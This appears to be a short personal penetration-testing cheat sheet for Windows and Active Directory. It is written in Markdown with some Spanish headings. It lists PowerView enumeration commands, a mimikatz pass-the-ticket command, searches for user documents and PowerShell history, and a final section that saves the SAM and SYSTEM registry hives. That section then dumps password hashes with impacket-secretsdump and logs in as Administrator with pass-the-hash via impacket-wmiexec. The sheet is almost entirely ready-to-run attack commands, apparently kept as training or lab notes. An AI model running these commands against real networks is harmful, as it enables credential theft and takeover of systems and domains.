## AD enumeration

### Kerberos TGT/TGS  (Kirbi)

```
dir *.kirbi
```

```
mimikatz # kerberos::ptt [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi
```

### PowerView.ps1

```
powershell -ep bypass
Import-Module .\PowerView.ps1
```

#### Domain 

```
Get-NetDomain
```

#### Users 

```
Get-NetUser | select cn
```

#### Groups

```
Get-NetGroup | select cn
```

#### Computers in Domain

```
Get-NetComputer
```

#### Converir Security identifier

```powershell
#S-1-5-21-1987370270-658905905-1781884369-1104
Convert-SidToName  S-1-5-21-1987370270-658905905-1781884369-1104
```

#### Domain Shares

```
Find-DomainShare
```


### Manual

#### Local Admin

```
Find-LocalAdminAccess
```

#### Login in a computer

```
Get-NetSession -ComputerName Servidor -Verbose
.\PsLoggedon.exe \\Servidor
```

## Local Enumeration

### Plain text files

```
 Get-ChildItem -Path C:\Users\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
```

###  powershell history

```
 Get-History
```

```
(Get-PSReadlineOption).HistorySavePath
```

### Scheduled Tasks

```
schtasks /query /fo LIST /v
```


## Backup SAM - SYSTEM

> [!tip]  BackupPrivilege permissions  necessary
> ```
>reg save hklm\sam C:\Users\USer\Desktop\SAM
>reg save hklm\system C:\Users\User\Desktop\SYSTEM
>```
>
>- con impacket dump credentials.
>
>```
>impacket-secretsdump -system SYSTEM -sam SAM local
>impacket-wmiexec -hashes :HASH Administrator@IP
>```